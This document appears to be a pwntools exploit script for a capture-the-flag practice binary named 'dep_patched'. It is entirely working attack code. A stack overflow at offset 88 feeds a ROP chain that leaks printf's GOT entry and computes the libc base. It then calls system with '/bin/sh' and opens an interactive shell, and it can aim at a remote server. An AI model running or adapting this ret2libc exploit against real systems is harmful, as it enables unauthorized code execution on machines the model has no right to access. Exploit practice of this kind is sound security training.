from pwn import *
from warnings import filterwarnings

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
break *0x00000000004011df
continue
'''.format(**locals())

# Binary filename
exe = './dep_patched'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'
filterwarnings("ignore")

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================


# Start program
io = start()
libc = elf.libc

offset = 88
pop_rdi = 0x0000000000401263 # pop rdi; ret; 
ret = 0x000000000040101a # ret; 

payload = flat({
    offset: [
        ret,
        pop_rdi,
        elf.got['printf'],
        elf.plt['printf'],
        0x00000000004011e1
    ]
})

io.sendline(payload)

io.recvline()
leak = unpack(io.recv()[:6].ljust(8, b'\x00'))
libc.address = leak - libc.sym['printf']
info("Libc base: %#x", libc.address)


system = libc.sym['system']
sh = next(libc.search(b'/bin/sh\x00'))

payload = flat({
    offset: [
        pop_rdi,
        sh,
        ret,
        system
    ]
})
io.sendline(payload)


io.interactive()
